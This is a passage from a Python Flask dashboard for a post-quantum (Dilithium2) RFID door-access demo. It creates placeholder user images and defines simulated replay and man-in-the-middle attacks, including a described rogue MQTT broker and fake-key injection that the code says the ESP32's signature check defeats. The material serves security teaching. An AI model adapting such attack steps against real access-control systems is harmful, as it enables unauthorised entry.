                {"name": "user2.JPG", "color": "#e74c3c", "text": "USER 2"}, 
                {"name": "admin.png", "color": "#f39c12", "text": "ADMIN"},
                {"name": "guest.png", "color": "#95a5a6", "text": "GUEST"},
                {"name": "default_user.png", "color": "#9b59b6", "text": "DEFAULT"}
            ]
            
            for user in users:
                # Create simple SVG placeholder
                svg_content = f'''<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
                    <rect width="200" height="200" fill="{user["color"]}"/>
                    <text x="100" y="100" font-family="Arial" font-size="20" fill="white" text-anchor="middle" dominant-baseline="middle">
                        {user["text"]}
                    </text>
                </svg>'''
                
                # Save as SVG file (change extension to .svg)
                svg_name = user["name"].rsplit('.', 1)[0] + '.svg'
                svg_path = os.path.join(self.static_dir, "images", svg_name)
                
                with open(svg_path, 'w', encoding='utf-8') as f:
                    f.write(svg_content)
            
            print("✅ SVG placeholder images created")
        
        except Exception as e:
            print(f"⚠️ Could not create user images: {e}")
            print("📝 Dashboard will work without user images")

    def get_user_image(self, card_uid):
        """Get user image based on card UID - Updated to handle both PIL and SVG"""
        # Check if PIL images exist first, then SVG fallback
        user_images_pil = {
            "9C85C705": "/static/images/user1.jpg",
            "3D8BC705": "/static/images/user2.JPG",
            "A1B2C3D4": "/static/images/admin.png",
            "E5F6G7H8": "/static/images/guest.png"
        }
        
        user_images_svg = {
            "9C85C705": "/static/images/user1.svg",
            "3D8BC705": "/static/images/user2.svg",
            "A1B2C3D4": "/static/images/admin.svg",
            "E5F6G7H8": "/static/images/guest.svg"
        }
        
        # Try PIL images first
        pil_path = user_images_pil.get(card_uid, "/static/images/default_user.png")
        if os.path.exists(os.path.join(self.static_dir, "images", os.path.basename(pil_path))):
            return pil_path
        
        # Fallback to SVG
        svg_path = user_images_svg.get(card_uid, "/static/images/default_user.svg")
        if os.path.exists(os.path.join(self.static_dir, "images", os.path.basename(svg_path))):
            return svg_path
        
        # Final fallback - create a simple data URL
        return "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIiBmaWxsPSIjOWI1OWI2Ii8+CiAgICA8dGV4dCB4PSIxMDAiIHk9IjEwMCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjIwIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSI+CiAgICAgICAgREVGQVVMVAogICAgPC90ZXh0Pgo8L3N2Zz4="

    def _get_mitm_attack_steps(self, server_data):
        """Get initial MITM attack steps"""
        return [
            {
                "step": 1,
                "title": "🎭 Thiết lập MITM Infrastructure & Card Listener",
                "details": [
                    "Khởi động rogue MQTT broker trên port 1884...",
                    "Tạo fake SSL certificate cho 'localhost'...",
                    "Thiết lập card detection listener...",
                    "🚨 MITM đang chờ bạn quét thẻ để intercept...",
                    "📱 Hãy quét thẻ của bạn vào ESP32 để thấy MITM hoạt động!",
                    "🎯 MITM sẽ tự động inject fake key khi detect card..."
                ],
                "technical_details": {
                    "mitm_setup": {
                        "fake_mqtt_broker": {
                            "host": "0.0.0.0",
                            "port": 1884,
                            "status": "ACTIVE",
                            "listening_for": "card_detected events",
                            "target_uid": "ANY_SCANNED_CARD"
                        },
                        "card_listener": {
                            "subscribed_topics": ["rfid/+", "rfid/esp32_to_server"],
                            "waiting_for": "card_detected message",
                            "auto_inject": True,
                            "fake_key_ready": True
                        },
                        "fake_dilithium_keys": {
                            "algorithm": "Dilithium2",
                            "fake_private_key_size": "2528 bytes",
                            "fake_public_key_size": "1312 bytes",
                            "fake_fingerprint": hashlib.sha256(b"fake_dilithium_key").hexdigest()[:32],
                            "real_fingerprint": server_data["server_fingerprint"],
                            "injection_trigger": "ON_CARD_SCAN"
                        }
                    }
                },
                "real_action": "setup_mitm_listener",
                "duration": 3
            },
            {
                "step": 2,
                "title": "🚨 MITM Đang Chờ Card Scan Event...",
                "details": [
                    "📱 MITM listener đã sẵn sàng...",
                    "🎯 Chờ ESP32 phát hiện thẻ RFID...",
                    "⚡ Khi có card_detected → MITM sẽ tự động inject fake auth_challenge",
                    "🔐 Fake challenge sẽ chứa key giả mạo của attacker",
                    "🛡️ ESP32 sẽ verify signature → phát hiện MITM",
                    "📊 Mutual authentication sẽ ngăn chặn attack..."
                ],
                "technical_details": {
                    "waiting_status": {
                        "listener_active": True,
                        "mqtt_subscriptions": ["rfid/esp32_to_server", "rfid/+"],
                        "trigger_event": "card_detected",
                        "injection_ready": True,
                        "fake_challenge_prepared": {
                            "session_id": f"MITM_{secrets.token_hex(8)}",
                            "fake_server_pubkey": base64.b64encode(secrets.token_bytes(1312)).decode()[:64] + "...",
                            "fake_signature": base64.b64encode(secrets.token_bytes(2420)).decode()[:64] + "...",
                            "injection_method": "Real-time MQTT injection"
                        }
                    },
                    "detection_mechanism": {
                        "esp32_will_verify": "dilithium_verify(stored_key, message, signature)",
                        "expected_result": "SIGNATURE_VERIFICATION_FAILED",
                        "mutual_auth_protection": "ESP32 has real server public key stored",
                        "attack_success_probability": "0% (cryptographically impossible)"
                    }
                },
                "real_action": "wait_for_card",
                "duration": 10
            }
        ]
    
    # Continue with remaining methods...
    def run_dashboard(self):
        """Start the web dashboard"""
        print("🌐 Starting Dilithium RFID Security Dashboard...")
        print("📊 Dashboard URL: http://localhost:5000")
        print("🎯 Features: Real-time MQTT monitoring, Attack simulation, Door animation")
        print("🔒 Security: Post-quantum Dilithium2 + AES-128 encryption")
        socketio.run(app, host='0.0.0.0', port=5000, debug=False)

# Global dashboard instance
dashboard = DilithiumWebDashboard()

# Flask routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory(dashboard.static_dir, filename)

@app.route('/start_attack', methods=['POST'])
def start_attack():
    attack_data = request.get_json()
    attack_type = attack_data.get('type')
    
    if dashboard.attack_active:
        return jsonify({"status": "error", "message": "Attack already in progress"})
    
    dashboard.attack_active = True
    dashboard.attack_type = attack_type
    
    if attack_type == 'replay':
        threading.Thread(target=dashboard.simulate_replay_attack).start()
    elif attack_type == 'mitm':
        threading.Thread(target=dashboard.simulate_mitm_attack).start()
    
    return jsonify({"status": "success", "attack_type": attack_type})

@app.route('/stop_attack', methods=['POST'])
def stop_attack():
    dashboard.attack_active = False
    dashboard.attack_type = None
    dashboard.mitm_waiting_for_card = False
    
    return jsonify({"status": "success"})

@app.route('/get_logs')
def get_logs():
    return jsonify(dashboard.system_logs[-50:])  # Return last 50 logs


@app.route('/get_status')
def get_status():
    return jsonify({
        "door_state": dashboard.door_state,
        "current_user": dashboard.current_user,
        "attack_active": dashboard.attack_active,
        "attack_type": dashboard.attack_type,
        "esp32_status": dashboard.esp32_status,
        "total_logs": len(dashboard.system_logs)
    })

if __name__ == "__main__":
    dashboard.run_dashboard()